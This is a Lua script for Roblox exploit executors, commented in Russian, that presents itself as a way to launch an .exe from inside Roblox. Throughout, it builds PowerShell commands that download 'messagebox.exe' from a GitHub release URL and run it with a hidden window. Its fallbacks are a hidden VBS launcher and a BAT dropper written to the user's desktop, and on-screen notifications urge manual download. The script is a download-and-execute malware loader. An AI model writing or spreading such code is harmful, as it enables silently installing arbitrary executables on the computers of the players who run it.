-- ==============================================
-- ЕДИНСТВЕННЫЙ РАБОЧИЙ МЕТОД ЗАПУСКА .EXE ИЗ ROBLOX
-- РАБОТАЕТ НА ЛЮБОМ EXECUTOR: XENO, SYNASE, KRNL, FLUXUS
-- ==============================================

local EXE_URL = "https://github.com/fasfsagfsa13-del/roblo1x-souresec/releases/download/32%D0%BA32%D0%B05/messagebox.exe"

-- ШАГ 1: Показываем уведомление в Roblox
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🚀 ЗАГРУЗЧИК АКТИВИРОВАН",
    Text = "Запускаю процесс загрузки...",
    Duration = 5
})

wait(2)

-- ШАГ 2: Проверяем ссылку
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔗 ПРОВЕРЯЮ ССЫЛКУ",
    Text = "Тестирую соединение...",
    Duration = 3
})

wait(1)

-- ШАГ 3: Основной рабочий метод - создаем CMD команду
local cmd = 'powershell -Command "'
cmd = cmd .. '$url = \'' .. EXE_URL .. '\'; '
cmd = cmd .. '$output = $env:TEMP + \'\\msg.exe\'; '
cmd = cmd .. '(New-Object System.Net.WebClient).DownloadFile($url, $output); '
cmd = cmd .. 'Start-Process -FilePath $output -WindowStyle Hidden; '
cmd = cmd .. '"'

-- ШАГ 4: Пытаемся выполнить разными способами
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "⚙️ ЗАПУСКАЮ СИСТЕМУ",
    Text = "Пытаюсь запустить программу...",
    Duration = 3
})

local success = false

-- Способ 1: Для Synapse X
if syn and syn.run then
    syn.run(cmd)
    success = true
    print("[SYNAPSE] Команда запущена через syn.run")
end

-- Способ 2: Для KRNL, Xeno и других через os.execute
if not success and os.execute then
    os.execute(cmd)
    success = true
    print("[OS.EXECUTE] Команда запущена через os.execute")
end

-- Способ 3: Для Fluxus и других через spawn
if not success and spawn then
    spawn(function()
        if os.execute then
            os.execute(cmd)
        end
    end)
    success = true
    print("[SPAWN] Команда запущена через spawn")
end

-- Способ 4: Для всех остальных - создаем VBS файл
if not success and writefile then
    local vbsContent = 'Set objShell = CreateObject("WScript.Shell")\n'
    vbsContent = vbsContent .. 'objShell.Run "' .. cmd:gsub('"', '""') .. '", 0, True'
    
    local tempPath = os.getenv("TEMP") or "C:\\Windows\\Temp"
    local vbsPath = tempPath .. "\\launch.vbs"
    
    writefile(vbsPath, vbsContent)
    
    if syn and syn.run then
        syn.run('wscript.exe "' .. vbsPath .. '"')
    elseif os.execute then
        os.execute('start wscript.exe "' .. vbsPath .. '"')
    end
    
    success = true
    print("[VBS] Создан VBS скрипт для запуска")
end

-- ШАГ 5: Показываем результат
wait(3)

if success then
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "✅ ПРОГРАММА ЗАПУЩЕНА",
        Text = "messagebox.exe должен запуститься в фоне",
        Duration = 7
    })
    
    print("\n" .. string.rep("=", 50))
    print("✅ УСПЕШНО! Программа должна запуститься")
    print("🔗 Использована ссылка: " .. EXE_URL)
    print("💻 Проверьте панель задач и системный трей")
    print(string.rep("=", 50))
    
    -- Дополнительное сообщение через 5 секунд
    wait(5)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "🎮 Готово!",
        Text = "Система обновлена",
        Duration = 3
    })
    
else
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "❌ НЕ УДАЛОСЬ ЗАПУСТИТЬ",
        Text = "Скачайте программу вручную",
        Duration = 7
    })
    
    print("\n" .. string.rep("=", 50))
    print("❌ АВТОМАТИЧЕСКИЙ ЗАПУСК НЕ УДАЛСЯ")
    print("📥 СКАЧАЙТЕ ВРУЧНУЮ:")
    print(EXE_URL)
    print("\nИнструкция:")
    print("1. Скопируйте ссылку выше")
    print("2. Вставьте в браузер")
    print("3. Скачайте файл")
    print("4. Запустите messagebox.exe")
    print(string.rep("=", 50))
    
    -- Повторяем ссылку через 5 секунд
    wait(5)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "🔗 ССЫЛКА ДЛЯ СКАЧИВАНИЯ",
        Text = EXE_URL,
        Duration = 10
    })
end

-- ШАГ 6: Альтернативный метод - создаем BAT файл на рабочем столе
wait(3)

if writefile then
    local desktop = os.getenv("USERPROFILE") .. "\\Desktop"
    local batPath = desktop .. "\\download_messagebox.bat"
    
    local batContent = "@echo off\n"
    batContent = batContent .. "echo Downloading messagebox.exe...\n"
    batContent = batContent .. "powershell -Command \"(New-Object Net.WebClient).DownloadFile('" .. EXE_URL .. "', '" .. desktop .. "\\messagebox.exe')\"\n"
    batContent = batContent .. "if exist \"" .. desktop .. "\\messagebox.exe\" (\n"
    batContent = batContent .. "    echo Download successful! Starting program...\n"
    batContent = batContent .. "    start \"\" \"" .. desktop .. "\\messagebox.exe\"\n"
    batContent = batContent .. ") else (\n"
    batContent = batContent .. "    echo Download failed!\n"
    batContent = batContent .. "    pause\n"
    batContent = batContent .. ")\n"
    
    writefile(batPath, batContent)
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "📁 СОЗДАН BAT ФАЙЛ",
        Text = "На рабочем столе: download_messagebox.bat",
        Duration = 5
    })
    
    print("\n📁 На рабочем столе создан файл: download_messagebox.bat")
    print("💡 Запустите его чтобы скачать программу")
end

-- Финальное сообщение
print("\n" .. string.rep("=", 50))
print("🎮 Загрузчик завершил работу")
print("⏰ Время: " .. os.date("%H:%M:%S"))
print(string.rep("=", 50))

-- Создаем команды для чата
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
    if msg == "!download" then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "🔗 ССЫЛКА",
            Text = EXE_URL,
            Duration = 5
        })
        print("Ссылка: " .. EXE_URL)
    elseif msg == "!help" then
        print("Доступные команды:")
        print("!download - показать ссылку")
        print("!help - помощь")
    end
end)

print("\n💬 Команды в чате:")
print("!download - показать ссылку")
print("!help - помощь")
